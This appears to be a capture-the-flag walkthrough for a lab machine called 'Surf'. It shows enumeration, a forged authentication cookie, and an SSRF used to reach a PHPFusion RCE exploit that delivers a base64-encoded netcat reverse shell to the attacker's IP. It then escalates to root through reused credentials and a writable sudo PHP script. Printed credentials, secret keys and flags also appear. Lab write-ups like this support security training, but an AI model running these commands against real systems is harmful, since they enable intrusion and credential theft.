																							               Surf Walkthrough
																										
Attacker's Machine: 192.168.45.5
Victim's Machine: 192.168.238.171
export IP=192.168.238.171
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

22/tcp open  ssh
80/tcp open  http

nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Surfing blog

nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
 <!-- nothing -->
 
 Vulnerability Assessment

nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 

nikto --url $IP

Port 80 - HTTP
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"

administration                            # http://192.168.238.171/administration/login.php           -- login page
assets                                       # directory listing on, nothing usefull
css
index.html
js


Inspect Page for possible technologies
Metis Menu CSS     metismenu - v1.1.3
Bootstrap - Clean Blog v6.0.3
Bootstrap v5.0.1

Potential username: admin

# While trying to log in, check the cookie auth_status eydzdWNjZXNzJzonZmFsc2UnfQ==
# Decode the cookie in base64 and notice that the value is 'success':'false'. Switch the success value to true so replace the value of auth_status.

eydzdWNjZXNzJzondHJ1ZSd9

# Reload the page with the new cookie value, we've in!
# After wasting time with a possible SQL injection within the Customers section, ORDER BY seems to be injectable. Not even with sqlmap coudn't get too much. 
# Back to my initial quess, the section Check Server Status uses a url parameter to make a get request to verify is a server is running. 
# After some waste attemps trying to get a shell through the url parameter, we notice that the server is using phpfusion.
“Check if the testing server where phpfusion is installed is correctly running.”

earchsploit phpfusion   bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuNSA4MCAK
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPFusion 9.03.50 - Remote Code Execution                                                                                                    | php/webapps/49911.py

# Since we don't have the ability to reach the phpfusion service directly, we can use it to help us leverage the SSRF vulnerability to achieve RCE.

# Reviewing the script, we can find that the requests are being made to "/infusions/downloads/downloads.php?cat_id=${system(ls)}" or  target + REQUEST_PAYLOAD.format(PAYLOAD_B64) with a base64-encoded payload. 
   One tricky thing is we are not able to use commands that, when base64 encoded, contain "+" or "=".
   Let's try to get a reverse shell. Our raw payload should be nc -e /bin/bash 192.168.45.5 4444. 
   We will then need to base64 encode it making sure to add a space to avoid "=" at the end of the encoded command.

echo "nc -e /bin/bash 192.168.45.5 80" | base64                     # bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuNSA4MAo=           equal sign, not good, let's try a different port

echo "nc -e /bin/bash 192.168.45.5 80 " | base64                    # bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuNSA4MCAK           No + or = sign, we should be good to go

# When you intercept the request in burp or check in the browser, we can see that by default, the phpfusion server runs on port 8080.
url=http://127.0.0.1:8080

# Since we cannot use our exploit directly on the server, we need to use curl to proc the shell. 

curl -X POST http://192.168.238.171/administration/checkserver.php -d 'url=http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_decode(bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuNSA4MCAK))}' --cookie "auth_status=eydzdWNjZXNzJzondHJ1ZSd9"

nc -lvnp 80                        # Got shell

cd /home/james
cat local.txt                       # Flag: da3ce13fadbf8bf5139a7ba673599639


Privilege escalation

# Let's search globally some some possible configuration files, maybe we get some credentials

find / -iname *'config.php'* 2>/dev/null
/var/www/server/administration/config/config.php
/var/www/html/config.php

cat /var/www/htmlconfig.php

$db_host = 'localhost';
$db_port = '3306';
$db_user = 'phpfusion';
$db_pass = 'phpfusion';
$db_name = 'phpfusion';
$db_prefix = 'fusionc6Jb6_';
$db_driver = 'pdo';
define("DB_PREFIX", "fusionc6Jb6_");
define("COOKIE_PREFIX", "fusion33hvd_");
define("SECRET_KEY", "2RH443cPDc588jUkNtQ29fjHwJIS89Ez");
define("SECRET_KEY_SALT", "F6UU9T38pjH48myWA3HqkkN431l26GkI");

cat /var/www/server/administration/config/config.php
define('DB_HOST', "localhost");
define('DB_USER', "core");
define('DB_PASSWORD', "FlyToTheMoon213!");
define('DB_NAME', "corephpadmin");

# Nothing too usefull in either of them, let's try some credentials reuse, especially since we already have the user james on the system

su james
FlyToTheMoon213!

sudo -l
Matching Defaults entries for james on Surf:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User james may run the following commands on Surf:
    (ALL) /usr/bin/php /var/backups/database-backup.php
    
ls -lsa /var/backups/database-backup.php
  -rwxr-xr-x 1 www-data www-data 2758 Nov  9  2021 /var/backups/database-backup.php
  
# Seems that we have full rights on it will www-data. I guess we have to switch back to www-data to edit the file and insert a payload that will give us root.

exit
cat /var/backups/database-backup.php
<?php system('/bin/bash -p'); ?>

su james
FlyToTheMoon213!
sudo /usr/bin/php /var/backups/database-backup.php
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat proof.txt                           # Flag: 0503610080b022eca5c634e146ec3c25
